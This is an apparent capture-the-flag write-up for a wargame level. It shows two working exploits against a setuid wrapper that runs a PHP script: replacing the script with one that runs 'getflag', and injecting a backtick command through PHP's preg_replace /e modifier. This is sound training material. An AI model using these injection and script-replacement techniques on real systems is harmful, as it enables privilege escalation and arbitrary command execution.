# Level 06


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:

*For this level, there are 2 methods to get the flag. The first one is easier, but the second one is more fun.*

Go to: &nbsp; [Method A](#method-a) &nbsp; | &nbsp; [Method B](#method-b)


### Method A:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
> -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
> -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
> -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
> -r-x------  1 level06 level06  675 Apr  3  2012 .profile
> ```
> There is 2 files called `level06` and `level06.php` that are readable and executable by the user `level06`.


#### Step 2:

- Let's see how the `level06` works:
```bash
objdump -s -d level06
```

> ```
> Contents of section .rodata:
>  80487c8 03000000 01000200 2e736f0a 002f7573  .........so../us
>  80487d8 722f6269 6e2f7068 70002f68 6f6d652f  r/bin/php./home/
>  80487e8 75736572 2f6c6576 656c3036 2f6c6576  user/level06/lev
>  80487f8 656c3036 2e706870 00                 el06.php.
> ```
> Just like in the previous level03, it stores the string `"/usr/bin/php /home/user/level06/level06.php"` in the `.rodata` section.
>
> We can guess that it will execute the `level06.php` script using the PHP interpreter.


#### Step 3:

- Let's just do our own `level06.php` script and see what happens:
```bash
chmod 777 .
rm -f level06.php
echo -e '#!/usr/bin/php\n<?php echo exec("getflag"); ?>' > level06.php
```

> [!CAUTION]
> This is a destructive action, it will remove the original `level06.php` file.
> If you want to keep it, you can save it somewhere else before removing it.
> ```bash
> cp level06.php /tmp/level06.php.bak
> ```


#### Step 4:

- Now we can run the `level06` program and get the flag:
```bash
./level06
```


<br>

---

<br>


### Method B


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
> -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
> -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
> -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
> -r-x------  1 level06 level06  675 Apr  3  2012 .profile
> ```
> There is 2 files called `level06` and `level06.php` that are readable and executable by the user `level06`.


#### Step 2:

- What's in the `level06.php` file?
```bash
cat level06.php
```

> ```php
> #!/usr/bin/php
> <?php
> function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
> function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
> $r = x($argv[1], $argv[2]); print $r;
> ?>
> ```

> The script is not so readable, let's arrange it a bit:
> ```php
> #!/usr/bin/php
> <?php
> function y($arg) {
> 	$arg = preg_replace("/\./", " x ", $arg);  // Replace . with " x "
> 	$arg = preg_replace("/@/", " y", $arg);    // Replace @ with " y"
> 	return $arg;
> }
> 
> function x($givenFile, $unusedArg) {
> 	$content = file_get_contents($givenFile);                            // Read the content of the file
> 	$content = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $content);  // Replace [x ...] with the RESULT of the y() function (thanks to the /e modifier)
> 	$content = preg_replace("/\[/", "(", $content);                      // Replace [ with (
> 	$content = preg_replace("/\]/", ")", $content);                      // Replace ] with )
> 	return $content;
> }
> 
> $result = x($argv[1], $argv[2]);
> print $result;
> ?>
> ```
>
> We can conclude that in the file given in argv[1], it will replace all the `[x ...]` with the result of the `y()` function, and then replace all the `[`, `]`, `.` and `@`. So we need to avoid these chars.


#### Step 3:

- Let's create a file containing our injection. In PHP, we can use the backticks operator to execute a command. So we can do something like:
```bash
echo '[x ${`getflag`}]' > /tmp/superLegitFile
```

- And even if it is an error (because <code>${&#96;getflag&#96;}</code> becomes something like `${Check flag. Here is your token : ...}` -> not a valid variable), the flag will still be printed.


#### Step 4:

- And then, we can run the `level06` program with our *legit* file.
```bash
./level06 /tmp/superLegitFile
```


<br>

---

[<<](/level05/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>